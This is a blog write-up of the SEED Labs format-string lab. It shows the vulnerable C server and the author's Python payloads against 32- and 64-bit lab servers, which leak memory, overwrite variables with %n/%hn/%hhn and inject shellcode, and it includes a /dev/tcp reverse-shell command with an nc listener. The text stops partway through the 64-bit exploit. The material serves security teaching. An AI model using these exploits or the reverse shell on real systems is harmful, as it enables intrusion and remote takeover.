---
layout: post
title: Format String Attack
excerpt: A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.In the C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering the program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.
description: [code injection]
---

A format string is a string that contains special format specifiers that act as placeholders for data. These format specifiers define how data should be displayed when it is substituted into the string.

In the C programming language, functions such as `printf()`, `sprintf()`, `fprintf()`, and `scanf()` can be used with format strings. The issue with format strings arises when programs allow users to provide the entire or part of the contents in a format string, and such inputs are not sanitized. Malicious users can use the opportunity to get the program to run arbitrary code.

The basic idea behind a format string attack is that an attacker can include additional format specifiers in the format string to access data or execute code that they should not have access to. For example, an attacker can use the %x specifier to read values from the stack or %n to write to arbitrary memory locations.

Exploiting a format string vulnerability can lead to various consequences, such as leaking sensitive information, altering the program state, crashing the program, or even executing arbitrary code. The impact of the attack depends on the specific vulnerability and the attacker's objectives.

<details>
<summary><b>SeedLabs: Format-String Vulnerability Lab</b></summary>
<div markdown="1">

- [Format-String Vulnerability Lab](https://seedsecuritylabs.org/Labs_20.04/Files/Format_String/Format_String.pdf)

___
</div></details>

<br>

<details>
<summary>Lab Notes</summary>
<div markdown="1">

Address randomization is disabled.
```bash
sudo /sbin/sysctl -w kernel.randomize_va_space=0
```
The server program is compiled such that the stack is executable.
```bash
-z execstack
```
Server details
```
The server hosting the 32-bit vulnerable program is at 10.9.0.5.
The server hosting the 64-bit vulnerable program is at 10.9.0.6.
The servers listen to port 9090 and invoke the appropriate vulnerable program when it receives a TCP connection.
```
</div></details>

<details>
<summary>The Vulnerable Program</summary>
<div markdown="1">

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/ip.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 * Suggested value: between 10 and 400  */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif


#if __x86_64__
  unsigned long target = 0x1122334455667788;
#else
  unsigned int  target = 0x11223344;
#endif 

char *secret = "A secret message\n";

void dummy_function(char *str);

void myprintf(char *msg)
{
#if __x86_64__
    unsigned long int *framep;
    // Save the rbp value into framep
    asm("movq %%rbp, %0" : "=r" (framep));
    printf("Frame Pointer (inside myprintf):      0x%.16lx\n", (unsigned long) framep);
    printf("The target variable's value (before): 0x%.16lx\n", target);
#else
    unsigned int *framep;
    // Save the ebp value into framep
    asm("movl %%ebp, %0" : "=r"(framep));
    printf("Frame Pointer (inside myprintf):      0x%.8x\n", (unsigned int) framep);
    printf("The target variable's value (before): 0x%.8x\n",   target);
#endif

    // This line has a format-string vulnerability
    printf(msg);

#if __x86_64__
    printf("The target variable's value (after):  0x%.16lx\n", target);
#else
    printf("The target variable's value (after):  0x%.8x\n",   target);
#endif

}


int main(int argc, char **argv)
{
    char buf[1500];


#if __x86_64__
    printf("The input buffer's address:    0x%.16lx\n", (unsigned long) buf);
    printf("The secret message's address:  0x%.16lx\n", (unsigned long) secret);
    printf("The target variable's address: 0x%.16lx\n", (unsigned long) &target);
#else
    printf("The input buffer's address:    0x%.8x\n",   (unsigned int)  buf);
    printf("The secret message's address:  0x%.8x\n",   (unsigned int)  secret);
    printf("The target variable's address: 0x%.8x\n",   (unsigned int)  &target);
#endif

    printf("Waiting for user input ......\n"); 
    int length = fread(buf, sizeof(char), 1500, stdin);
    printf("Received %d bytes.\n", length);

    dummy_function(buf);
    printf("(^_^)(^_^)  Returned properly (^_^)(^_^)\n");

    return 1;
}

// This function is used to insert a stack frame between main and myprintf.
// The size of the frame can be adjusted at the compilation time. 
// The function itself does not do anything.
void dummy_function(char *str)
{
    char dummy_buffer[BUF_SIZE];
    memset(dummy_buffer, 0, BUF_SIZE);

    myprintf(str);
}
```
</div></details>

<br>

###  Crashing the Program

This task involves crashing a 32-bit, vulnerable program running on a remote server. The lab has been designed in such a way that when the vulnerable program runs normally, it prints out some essential values that we would need to practice a format string attack.

So we first send a benign message to the server to get these values.
```bash
echo hello | nc -w5 10.9.0.5 9090
```

![task-1-a](https://github.com/iukadike/blog/assets/58455326/53b9aa05-b681-4c0c-bb06-baad0813ea09)


When a program uses a format string, the function using the format string takes its values from the stack.

Take, for example, a program that uses the below format string:

```c
#include <stdio.h>

int main() {
  char name[] = "John Doe";
  char planet[] = "Earth";
  printf("My name is %s and I am from planet %s", name, planet);
}
```

When the stack is built, the optional arguments (name and planet) are placed right above the format string argument. Based on the number of format specifiers, the program tries to access the memory addresses of these optional arguments. Thus, if for any reason the format specifiers are more than the optional arguments provided, the program will try to read the memory address of an area it has no access to, leading to a segmentation fault and crashing the program.

To crash the program, we need to introduce format specifiers so the program will try to read the memory address of an area it has no access to, leading to a segmentation fault. In this case, one format specifier seems to be enough to crash the program.

```bash
echo %s | nc -w5 10.9.0.5 9090
```

![task-1-b](https://github.com/iukadike/blog/assets/58455326/f10426bc-b091-44b4-b10b-f1b6912b7e89)


We can tell that the format program has crashed because it did not print out "Returned properly" and a few smiley faces.


<br>

### Printing Out the Server Program’s Memory

The objective of this task is to get the server to print out some data from its memory.

#### Stack Data

When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task, we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.

Thus, our input will start with a value we know, i.e., AAAA = \x41\x41\x41\x41, and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.

```python
#!/usr/bin/python3
import sys

# Start input with a content we can easily recognize
content = ("AAAA").encode('latin-1')

# Append format specifiers
content += ("_%x" * 80).encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-2-a](https://github.com/iukadike/blog/assets/58455326/91b01fc5-faeb-43e6-88de-2eb0701e58da)


After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 64. Thus, it will take 64 `%x` to print out the first four bytes of my input.

#### Heap Data

There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is `0x080b4008`. In order to print out the value stored in this memory address, we will use `0x080b4008` as the first value in our input, pad it with 63 `%x` so that our program will not crash, and then print out the secret message with `%s` to complete the offset.

Our initial code will be modified to achieve this.

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of secret message
content = (0x080b4008).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("_%x" * 63).encode('latin-1')

# print out the value stored in 0x080b4008
content += ("_%s").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-2-b](https://github.com/iukadike/blog/assets/58455326/1349d122-2a47-4d5d-b88f-bc1abeb29914)



<br>

### Modifying the Server Program’s Memory

The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program, attackers can change the behavior of the program if they can modify this value.
We know that the memory address of the target variable is `0x080e5068`

#### Changing the value to a different value

This task involves changing the content of the target variable to any value different from the original. The `%n` format specifier writes the number of characters that have been printed by printf() before its occurrence into a memory address (this memory address corresponds to the corresponding argument for %n%).

Since we know that our offset is 64, we will need to write our code in such a way that the program will print out characters up to offset 63, then use `%n%` at offset 64 to modify the value stored in the memory address of the target variable we provided as the start of our input.

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of the target variable
content = (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("%x" * 63).encode('latin-1')

# Access 0x080e5068 and overwrite it's content
content += ("%n").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-3-a](https://github.com/iukadike/blog/assets/58455326/4979740e-f043-412b-89d7-a0e612b73122)


#### Changing the value to 0x5000.

This task involves changing the content of the target variable to "0x5000" rather than a random variable. This is more tricky than the previous task because we need to print out `0x5000 = 20480` characters. We can use precision modifiers (which pad the didgits with zeros to achieve the desired width), which control the minimum number of digits to print to achieve this. Typically, multiple format specifiers with different precision modifiers will have to be used.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0x5000 = 20480
- The offset is 64, and will contain multiple format specifiers:
  - we need one for the %n% format specifier
  - we need one for the modulo number precision modifier for %x
  - we need 64 - 2 for the whole number precision modifier for %x
- The first 4 bytes are where I would store the target variable's address.
  - 20480 - 4 = 20476
- The whole number precision modifier for %x:
  - 20476 // 62 = 330
- The modulo number precision modifier for %x:
  - 20476 % 62 = 16
 
To verify our math, 4 + (330 x 62) + 16 = 20480 = 0x5000

```python
#!/usr/bin/python3
import sys

# Start input with the memory address of the target variable
content = (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing
content += ("%.330x" * 62).encode('latin-1')
content += ("%.16x").encode('latin-1')

# Access 0x080e5068 and overwrite it's content
content += ("%n").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-3-b](https://github.com/iukadike/blog/assets/58455326/ad7456ff-68ba-446d-95a7-14d83bd10c22)


#### Changing the value to 0xAABBCCDD.

In this task, the target value is a large number. This value is the total number of characters that are printed out by the printf() function. Printing out this large number of characters may take hours. A faster approach is to use %hn or %hhn instead of %n, so we can modify a two-byte (or one-byte) memory space instead of four bytes.

##### Using %hn

While %n treats the argument provided as a 4-byte integer, %hn treats the argument as a 2-byte integer, overwriting the least significant bytes of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` two bytes at a time.

Our program is a 32-bit program so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into two parts with two bytes each.
- 0x080e5068 => 0xCCDD
- 0x080e506a => 0xAABB

The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0xAABB = 43707
- 0xCCDD = 52445
- The offset is 64 and will contain multiple format specifiers:
  - we need one for the %hn% format specifier for the first address
  - we need one for the %x modulo precision modifier for the first address
  - we need 64 - 2 for the %x whole number precision modifier for the first address
- The string will start with the address that will contain a lower value, be appended by 4 bytes of random data to account for the %x specifier that will be used for the second address, and finally the address that will contain a higher value. This is a total of 12 bytes.
- The first address will store a lower value, which is 0xAABB (43707). The first 12 bytes are where I would store the target variable's addresses.
  - 43707 - 12 = 43695
- The whole number %x precision modifier for the first address is:
  - 43695 // 62 = 704
- The modulo number %x precision modifier for the first address is:
  - 43695 % 62 = 47
- The second address will store a higher value, which is 0xCCDD (52445). To determine the number of %x precision modifiers to use, we would subtract 0xAABB from 0xCCCC:
  - 0xCCDD - 0xAABB = 52445 - 43707 = 8738

```python
#!/usr/bin/python3
import sys

# Start input with the memory address that will store a lower value
content = (0x080e506a).to_bytes(4,byteorder='little')

# Append 4-bytes to account for writing to the second memory address
content += ("@@@@").encode('latin-1')

# Append the memory address that will store a higher value
content += (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing, access 0x080e506a and overwrite it's content
content += ("%.704x" * 62).encode('latin-1')
content += ("%.47x%hn").encode('latin-1')

# Append format specifiers to prevent the program from crashing, access 0x080e5068 and overwrite it's content
content += ("%.8738x%hn").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-3-c](https://github.com/iukadike/blog/assets/58455326/3d8147cb-6ef1-44b3-a97f-dfcbde131116)


___

Rather than using so many %x in our attack, we can make use of just one to build up the number we want to write into a memory address and use a modifier (K$) to move the pointer to the Kth element we want to write into.

The above code can be modified as below to achieve this:

```python
#!/usr/bin/python3
import sys

# Start input with the memory address that will store a lower value
content = (0x080e506a).to_bytes(4,byteorder='little')

# Append the memory address that will store a higher value
content += (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers
content += ("%.43699x%64$hn").encode('latin-1')
content += ("%.8738x%65$hn").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

As we can see, the result is the same.

![task-3-d](https://github.com/iukadike/blog/assets/58455326/84ea0a05-b6d1-4c0d-9938-e5175b22c50f)



##### Using %hhn

While %n treats the argument provided as a 4-byte integer, %hhn treats the argument as a 1-byte integer, overwriting the least significant byte of the argument. We are going to place `0xAABBCCDD` into memory address `0x080e5068` one byte at a time.

Our program is a 32-bit program, so our address is a 4-byte address. Our machine is little-endian, so we break `0xAABBCCDD` into four parts with one byte each.
- 0x080e5068 => 0xDD
- 0x080e5069 => 0xCC
- 0x080e506a => 0xBB
- 0x080e506b => 0xAA

The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0xAA = 170
- 0xBB = 187
- 0xCC = 204
- 0xDD = 221
- The offset is 64, and will contain multiple format specifiers:
  - we need one for the %hhn% format specifier for the first address
  - we need one for the %x modulo precision modifier for the first address
  - we need 64 - 2 for the %x whole number precision modifier for the first address
- The string will be built as: lower value address +  4 bytes of random data to account for the %x specifier that will be used for the second address + next higher value address + 4 bytes of random data to account for the %x specifier that will be used for the third address + next higher value address + 4 bytes of random data to account for the %x specifier that will be used for the fouth address + the highest value address. This is a total of 28 bytes.
- The first address will store a lower value which is 0xAA (170). The first 28 bytes are where I would store the target variable's addresses.
  - 170 - 28 = 142
- The whole number %x precision modifier for the first address is:
  - 142 // 62 = 2
- The modulo number %x precision modifier for the first address is:
  - 142 % 62 = 18
- The second address will store a higher value, which is 0xBB.
  - 0xBB - 0xAA = 17
- The third address will store a higher value, which is 0xCC.
  - 0xCC - 0xBB = 17
- The last address will store a higher value, which is 0xDD.
  - 0xDD - 0xCC = 17

<details>
<summary>notes</summary>
<div markdown="1">

For some reasons not yet known to me, putting the value of 170 in 0x080e506b does not produce the intended outcome, which is 0xaa. I find that I have to increase the value I put in 0x080e506b.
After some tinkering, I was able to determine that putting the value of 285 in 0x080e506b produces 0xaa. Everything else works as expected.

I have yet to determine why this happens.
</div></details>


```python
#!/usr/bin/python3
import sys

# Start input with the memory address that will store a lower value
content = (0x080e506b).to_bytes(4,byteorder='little')

# Append 4-bytes to account for writing to the second memory address
content += ("@@@@").encode('latin-1')

# Append the next memory address
content += (0x080e506a).to_bytes(4,byteorder='little')

# Append 4-bytes to account for writing to the third memory address
content += ("@@@@").encode('latin-1')

# Append the next memory address
content += (0x080e5069).to_bytes(4,byteorder='little')

# Append 4-bytes to account for writing to the fourth memory address
content += ("@@@@").encode('latin-1')

# Append the memory address that will store a highest value
content += (0x080e5068).to_bytes(4,byteorder='little')

# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
content += ("%.2x" * 62).encode('latin-1')
content += ("%.133x%hhn").encode('latin-1')

# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
content += ("%.17x%hhn").encode('latin-1')

# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
content += ("%.17x%hhn").encode('latin-1')

# Append format specifiers to prevent the program from crashing, access 0x080e506b and overwrite it's content
content += ("%.17x%hhn").encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-3-e](https://github.com/iukadike/blog/assets/58455326/2eff533a-f05c-4706-a091-5d3b7e703def)



<br>

### Inject Malicious Code into the Server Program

This task involves injecting a piece of malicious code, in its binary format, into the server’s memory and then using the format string vulnerability.
to modify the return address field of a function, so when the function returns, it jumps to our injected code.

In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.

We would be needing two values:
- the frame-pointer address inside the vulnerable function
- the input buffer's address

From the information the server prints out, we can determine these values to be:
- ffffd188 (frame-pointer address)
- ffffd260 (input buffer's address)

When we build our attack string, it will consist of the following:
- the return address of the vulnerable function
  - frame-pointer address + 4
- the memory address of our malicious code:
  - the input buffer's address + (a value yet to be determined)
- the malicious code

![task-4-a](https://github.com/iukadike/blog/assets/58455326/c0568d33-84ce-4e2d-bd91-d5fde2c31af6)


```python
#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
   "DDDDDDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# Choose the shellcode version based on your target
shellcode = shellcode_32

############################################################
#    Construct the format string here                      #
############################################################

# return address    = 0xffffd18c
# buffer address    = 0xffffd260
# shellcode address = 0xffffd260 + 0x212 = 0xffffd472

content = (0xffffd18c).to_bytes(4,byteorder='little')
content += ("@@@@").encode('latin-1')
content += (0xffffd18e).to_bytes(4,byteorder='little')

# address 0xd472
content += ("%.00600x" * 62).encode('latin-1')
content += ("%.17174x%hn").encode('latin-1')

# address 0xffff
content += ("%.11149x%hn").encode('latin-1')

# determine the size of content before adding the shellcode
#print(f"size of content before shellcode = {len(content)}")    # 530 = 0x212

# shellcode
content += shellcode


# Save the format string to file
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-4-b](https://github.com/iukadike/blog/assets/58455326/6188e926-7bab-4897-a1ff-4699426829fc)


<details>
<summary>Code explanation</summary>
<div markdown="1">

```python
# return address    = 0xffffd18c
# buffer address    = 0xffffd260
# shellcode address = 0xffffd260 + 0x212 = 0xffffd472
```

I write out the addresses I will need for easy reference.

```python
content = (0xffffd18c).to_bytes(4,byteorder='little')
content += ("@@@@").encode('latin-1')
content += (0xffffd18e).to_bytes(4,byteorder='little')
```

The return address will be written 2-bytes at a time, so I start the payload with the address that will contain a lower value, pad it with 4-bytes to account for the %hn% format specifier, and conclude with the address that will contain a higher value.

```python
# address 0xd472
content += ("%.00600x" * 62).encode('latin-1')
content += ("%.17174x%hn").encode('latin-1')

# address 0xffff
content += ("%.11149x%hn").encode('latin-1')
```

This is used to count up to 0xd472 and write it into 0xfffd18c.
Since the size of the payload before the shellcode is added is yet to be determined, in order to maintain a definite size, I set the %x format specifers to initially be "%.00000x". This way, when i have determined the shellcode address, I can modify the specifiers and still maintain a constant size.

```python
# determine the size of content before adding the shellcode
#print(f"size of content before shellcode = {len(content)}")    # 530 = 0x212
```

I use this block of code to initially print the offset from the start of the payload, where the shellcode will reside in memory. After running the program, I got a value of 513. I can now do the following:
- determine the shellcode address by adding the offset to the buffer address.
- use the calculated address to build the format specifiers

</div></details>

#### Getting a Reverse Shell

Getting a shell is more interesting than running arbitrary commands. The goal of this task is to get a shell on the target server, so we can type any command we want.

To achieve this, all that needs to be edited is the command argument of the bash command in the shell code.

```python
#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')

# existing code continues below
```

Next is to set up a listener...

```bash
nc -nvl 9090
```

then run the attack.

```bash
python3 badfile.py
cat badfile | nc -w2 10.9.0.5 9090
```

![task-4-c](https://github.com/iukadike/blog/assets/58455326/76c5f430-e5b1-4e6d-9c75-7f5ddb46a5c6)



<br>

### Attacking the 64-bit Server Program

Attacking a 64-bit server is tricky because the memory address is 8 bytes with zeros in it. Only the address from 0x00 through 0x00007FFFFFFFFFFF is allowed, and every 64-bit address has the highest two bytes as zeros. This causes a problem, as when `printf()` parses the format string, it will stop the parsing when it sees a zero.

We know that zeros will terminate copying to memory if strpcy() is used, but the vulnerable program does not make use of strcpy(). This means we can have zeros in our input, but because of the `printf()`, we will have to place them where they cannot interrupt `printf()` parsing the format string.

A method I have taken to solve this problem is to place the 64-bit addresses after the format specifiers in the format string. Remember that during the 32-bit attack, the 32-bit addresses were placed at the beginning of the format string.


#### Printing Out Stack Data

When we use the "%x" format specifier, it instructs the program to access a memory location and print out the hex value of the contents in that memory location. For this task, we would need to build our input to the server such that when the values in memory are printed, we can tell the offset from the beginning of the stack.

Thus, our input will start with a value we know, i.e., AAAAAAAA = \x41\x41\x41\x41\x41\x41\x41\x41, and will be made up of an increasing number of "%x" until we are able to see the value \x41\x41\x41\x41 printed out.

```python
#!/usr/bin/python3
import sys

# Start input with a content we can easily recognize
content = ("AAAAAAAA").encode('latin-1')

# Append format specifiers
content += ("_%x" * 40).encode('latin-1')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

![task-5-a](https://github.com/iukadike/blog/assets/58455326/e91c19e1-379a-4a7d-a5ad-5505f12c2440)


After a number of trials and errors, I was able to determine that the offset of our input from the beginning of the stack is 34. Thus, it will take 34 %x to print out the first eight bytes of my input.


#### Printing Out Heap Data

There is a secret message that is stored on the heap when the program runs. We know that the memory address of this secret message on the heap is 0x0000555555556008. In order to print out the value stored in this memory address, while constructing our format string, we will have to put 0x0000555555556008 after all the format specifiers.

Our initial code that achieves this is:

```python
#!/usr/bin/python3
import sys

secret = 0x0000555555556008

# Start the string with the format specifiers
# I pad zeros to keep the lenght at 8-bytes
content = ("%00035$s").encode('latin-1')

# Append the address
content += (secret).to_bytes(8,byteorder='little')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

![task-5-b](https://github.com/iukadike/blog/assets/58455326/e80bb554-beb2-49a9-a782-a6ae83363a4b)



#### Modifying the Target Value to 0xAAAABBBBCCCCDDDD

The objective of this task is to modify the value of the target variable that is defined in the server program. If this target variable holds an important value that can affect the control flow of the program, attackers can change the behavior of the program if they can modify this value. We know that the memory address of the target variable is 0x0000555555558010.

I will be using %hn to modify the target address, 2 bytes at a time. I am going to place 0xAAAABBBBCCCCCDDDD into 0x0000555555558010, two bytes at a time.

Our program is a 64-bit program, so our address is an 8-byte address. Our machine is little-endian, so we break `0xAAAABBBBCCCCCDDDD` into four parts with four bytes each.
- 0x0000555555558010   <-- 0xDDDD
- 0x0000555555558012   <-- 0xCCCC
- 0x0000555555558014   <-- 0xBBBB
- 0x0000555555558016   <-- 0xAAAA

The values written are cumulative, so when constructing our string, we have to start with the addresses that will store lower values.

For this task, I need to determine the total number of characters I would need to print for each precision modifier.
- 0xAAAA = 43690
- 0xBBBB = 48059
- 0xCCCC = 52428
- 0xDDDD = 56797
- The offset is 34; the string will start with the four format specifiers for the four addresses we want to write into
  - 34 + 4 = 38
  - however, we have to take into consideration that we are dealing with a 64-bit program. This means each address is 8-bytes and we have to format our specifiers in such a way that they take up 8-bytes of memory space
  - This leads us to 34 + 4 * 2 = 42
- Now we have to determine the %x specifier that will be used for the addresses. The lowest number is 0xAAAA, so this will start.
  - 0xAAAA = 43690
- The next address will store a higher value which is 0xBBBB.
  - 0xBBBB - 0xAAAA = 4369
- The next address will store a higher value which is 0xCCCC.
  - 0xCCCC - 0xBBBB = 4369
- The next address will store a higher value which is 0xDDDD.
  - 0xDDDD - 0xCCCC = 4369

```python
#!/usr/bin/python3
import sys

#target = 0x0000555555558010
t1      = 0x0000555555558016    # <-- 0xAAAA
t2      = 0x0000555555558014    # <-- 0xBBBB
t3      = 0x0000555555558012    # <-- 0xCCCC
t4      = 0x0000555555558010    # <-- 0xDDDD

# Create format string
# I pad zeros to keep the lenght at 16-bytes
content  = ("%.0043690x%42$hn").encode('latin-1')    # <-- 0xAAAA
content += ("%.0004369x%43$hn").encode('latin-1')    # <-- 0xBBBB
content += ("%.0004369x%44$hn").encode('latin-1')    # <-- 0xCCCC
content += ("%.0004369x%45$hn").encode('latin-1')    # <-- 0xDDDD

content += (t1).to_bytes(8,byteorder='little')
content += (t2).to_bytes(8,byteorder='little')
content += (t3).to_bytes(8,byteorder='little')
content += (t4).to_bytes(8,byteorder='little')

# Append a newline
content += ("\n").encode('latin-1')


# Write the content to badfile
with open('badfile', 'wb') as f:
  print(f"writing {len(content)} bytes to badfile...")
  f.write(content)
```

![task-5-c](https://github.com/iukadike/blog/assets/58455326/1a87aa2a-b4e8-4baf-949f-b7f5a822f19b)



#### Inject Malicious Code into the Server Program (A reverse shell)

This task involves injecting a piece of malicious code, in its binary format, into the server’s memory and then using the format string vulnerability to modify the return address field of a function, so when the function returns, it jumps to our injected code—a reverse shell.

In order to inject malicious code into the server program, we would need to modify the value that is stored in the return address of the function we are exploiting. This lab has been designed in such a way that when the program runs, it prints out certain values for the student.

We would be needing two values:
- the frame-pointer address inside the vulnerable function
- the input buffer's address

From the information the server prints out, we can determine these values to be:
- 0x00007FFFFFFFE0D0 (frame-pointer address)
- 0x00007FFFFFFFE190 (input buffer's address)

When we build our attack string, it will consist of the following:
- the return address of the vulnerable function = frame-pointer address + 8
- the memory address of our malicious code = the input buffer's address + (a value yet to be determined)
- the malicious code

![task-5-d](https://github.com/iukadike/blog/assets/58455326/06217c07-3ebf-42be-bcd5-88e97ebefbcd)


The code we will use to attack the server is as follows:

```python
#!/usr/bin/python3
import sys

# 32-bit Generic Shellcode 
shellcode_32 = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/ls -l; echo '===== Success! ======'                  *"
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')


# 64-bit Generic Shellcode 
shellcode_64 = (
   "\xeb\x36\x5b\x48\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x48"
   "\x89\x5b\x48\x48\x8d\x4b\x0a\x48\x89\x4b\x50\x48\x8d\x4b\x0d\x48"
   "\x89\x4b\x58\x48\x89\x43\x60\x48\x89\xdf\x48\x8d\x73\x48\x48\x31"
   "\xd2\x48\x31\xc0\xb0\x3b\x0f\x05\xe8\xc5\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   # The * in this line serves as the position marker         *
   "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1           *"
   "AAAAAAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBBBBBB"   # Placeholder for argv[1] --> "-c"
   "CCCCCCCC"   # Placeholder for argv[2] --> the command string
